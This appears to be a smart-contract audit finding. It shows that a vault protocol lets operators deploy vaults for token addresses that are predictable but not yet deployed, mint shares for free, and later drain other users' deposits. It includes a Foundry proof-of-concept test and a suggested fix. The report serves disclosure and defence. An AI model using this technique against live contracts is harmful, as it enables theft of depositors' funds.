# Vulnerability details

## Impact
A vault can be deployed for a non-deployed deterministic token address and then user can mint shares for free before the deployment of the token.

## Proof of Concept
We can see when a user deposit/mint in a `Vault.sol`, it uses the Solady SafeTransferLib contract to perform the `safeTransferFrom()`. When we take a deep look on the function we can see when there is no return data, the function [always pass](https://github.com/Vectorized/solady/blob/1f43cc8005cc3b3c8361dd7dbdd2cdeaf0f99e66/src/utils/SafeTransferLib.sol#L197-L218).

While this may not seem problematic, there are many token addresses that are deterministic. For example, we can predict the address of the next Curve LP token to be created, or the next token to be minted by the Optimism Bridge.

When a vault is created for a token, the `Core` contract doesn't verify if the token is deployed.
It can be problematic, a malicious user can request to the manager of the `Core` contract to allow an asset on the protocol, there no verification if the token contract exist on the `allowlistAssets()` and the function is executed.
Therefore malicious operator can create vault with the token and mint a lot of shares for free.
When the token is deployed and others users deposits on the `Vault`, the malicious operator can burn all theses shares to drain the vault.

You can add this following Poc in `./test/vault/vault.t.sol`: 

```solidity
    function test_vaultOnDetermenisticNonExistingToken() public {
        address user = vm.addr(222);
        //Random non deployed erc20Token address
        address erc20Token = 0x22222290Dd7278AA3DDD389CC1E1d165cC4bafE5;

        //Admin allow the asset on Core
        address[] memory assets = new address[](1);
        assets[0] = address(erc20Token);
        
        address[] memory slashingHandlers = new address[](1);
        slashingHandlers[0] = slashingHandler;
        vm.prank(manager);
        core.allowlistAssets(assets, slashingHandlers);

        // Deploy Vaults
        VaultLib.Config[] memory vaultConfigs = new VaultLib.Config[](1);
        vaultConfigs[0] = VaultLib.Config({
            //Random non existing ERC20 addrees 
            asset: erc20Token,
            decimals: 18,
            operator: operator,
            name: "TestVault",
            symbol: "TV",
            extraData: bytes("")
        });
        vm.prank(operator);
        IKarakBaseVault[] memory vaults = core.deployVaults(vaultConfigs, address(0));
        vault = Vault(address(vaults[0]));

        uint256 balance = vault.balanceOf(user);
        console.log("Balance of shares before: %s", balance);

        //Deposit for free
        vm.prank(user);
        vault.deposit(1000000000, user);

        balance = vault.balanceOf(user);
        console.log("Balance of shares after: %s", balance);
    }
```

`forge test --mt test_vaultOnDetermenisticNonExistingToken -vvv`

## Tools Used

Manual Review

## Recommended Mitigation Steps

Add the `isSmartContract()` verification for at least one of the two functions: `allowlistAssets()` and `deployVaults()`.
